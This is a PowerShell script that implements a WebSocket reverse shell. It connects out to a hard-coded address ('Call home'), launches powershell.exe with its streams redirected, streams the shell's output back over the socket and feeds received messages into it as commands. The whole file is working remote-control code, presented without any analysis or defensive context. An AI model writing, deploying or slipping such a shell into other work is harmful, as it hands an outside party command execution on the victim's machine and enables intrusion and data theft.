# Credits:
# https://stackoverflow.com/questions/23239127/powershell-stream-process-output-and-errors-while-running-external-process

# Might wanna change this
$endpoint = "ws://10.0.2.2:8080"

$ws = New-Object Net.WebSockets.ClientWebSocket
$cancellationTokenSource = New-Object Threading.CancellationTokenSource
$cancellationToken = New-Object Threading.CancellationToken($false)

# Call home
$ws.ConnectAsync($endpoint, $cancellationTokenSource.Token).
    GetAwaiter().
    GetResult()

Write-Host -ForegroundColor Green "Connected"

# Define the process start info for a shell
# Redirect all the streams so that we can interact with them
$StartInfo = New-Object System.Diagnostics.ProcessStartInfo -Property @{
    FileName = 'powershell.exe'
    Arguments = ''
    UseShellExecute = $false
    RedirectStandardOutput = $true
    RedirectStandardError = $true
    RedirectStandardInput = $true
}

# Define the process itself
$Process = New-Object System.Diagnostics.Process
$Process.StartInfo = $StartInfo

# Helper function to register events for data received
# writing them to the websocket connection
function EventTo-WebSocket($EventName) {
    return Register-ObjectEvent -Action {
        $cancellationToken = New-Object Threading.CancellationToken($false)
        # Don't forget to append the newline
        $line = $Event.SourceEventArgs.Data + "`n"
        [ArraySegment[byte]] $OutBytes = [Text.Encoding]::UTF8.GetBytes($line)
        $ws.SendAsync(
                    $OutBytes,
                    [System.Net.WebSockets.WebSocketMessageType]::Binary,
                    $true,
                    $cancellationToken
        ).GetAwaiter().GetResult()
    } -InputObject $Process -EventName $EventName
}

# Register events for stdout and stderr
$OutEvent = EventTo-WebSocket "OutputDataReceived"
$ErrEvent = EventTo-WebSocket "ErrorDataReceived"
Write-Host -ForegroundColor Green "Registered object events for reading stdout and stderr"

[void]$Process.Start()
Write-Host -ForegroundColor Green "Started process"

$Process.BeginOutputReadLine()
$Process.BeginErrorReadLine()
Write-Host -ForegroundColor Green "Started reading streams"

# Create a buffer to read from the websocket
$buffer = [Net.WebSockets.WebSocket]::CreateClientBuffer(1024, 1024)
$cancellationToken = New-Object Threading.CancellationToken($false)

while ($ws.State -eq [Net.WebSockets.WebSocketState]::Open) {
    $received = $ws.ReceiveAsync($buffer, $cancellationToken).
	GetAwaiter().
	GetResult()
    $orders = [Text.Encoding]::UTF8.GetString($buffer, 0, $received.Count)
    Write-Host -ForegroundColor Green "Player: $orders"
    $Process.StandardInput.Write($orders)
}

$OutEvent.Name, $ErrEvent.Name | ForEach-Object {Unregister-Event -SourceIdentifier $_}
$ws.CloseAsync(
    [System.Net.WebSockets.WebSocketCloseStatus]::Empty,
    "",
    $cancellationToken
).GetAwaiter().GetResult()

$ws.Dispose()